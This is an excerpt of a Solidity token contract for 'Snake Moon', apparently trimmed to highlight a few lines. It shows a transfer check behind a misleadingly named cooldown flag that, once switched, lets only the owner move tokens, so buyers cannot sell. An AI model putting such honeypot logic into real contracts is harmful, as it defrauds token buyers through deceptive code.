...
https://t.me/SnakeMoonOfficial

www.Snakemoon.com Under Development
...
contract SNAKEMOON is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0x5310993bc91631dFE5FaA674a2072e213E8f0fB4); 
    address payable private Wallet_Dev = payable(0xBa7E08a38E02a190a6EC9Cab49540d59D0fe7282);
    ...
    string private constant _name = " Snake Moon"; 
    string private constant _symbol = unicode"SNAKEMOON"; 
    ...
    bool private _buyCooldownDisabled = true;
    ...
    constructor () {
        ...
        _owner = 0xBa7E08a38E02a190a6EC9Cab49540d59D0fe7282;
    ...
    function _transfer(
        ...
        if(!_buyCooldownDisabled)
            require(from == owner() || from == uniswapV2Pair && to == owner(), "Over transaction limit.");
